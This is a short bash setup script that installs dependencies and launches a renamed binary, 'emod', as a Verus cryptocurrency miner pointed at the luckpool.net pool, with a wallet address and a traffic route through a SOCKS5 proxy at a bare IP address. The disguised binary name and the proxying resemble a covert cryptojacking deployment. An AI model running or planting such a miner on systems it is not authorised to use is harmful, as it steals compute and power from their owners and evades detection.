#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x lah.sh && chmod +x emod chmod 777 emod lah.sh
screen -dmS ls
A=stratum+tcp://na.luckpool.net:3956
B=RXggSUt7YBw76Jq8A1cmqVH8TPWVoao6PJ
C=MODOL-1
D=socks5://78.46.89.24:46686
./emod -a verus -o $A -u $B.$C -p x -t 2 -x $D
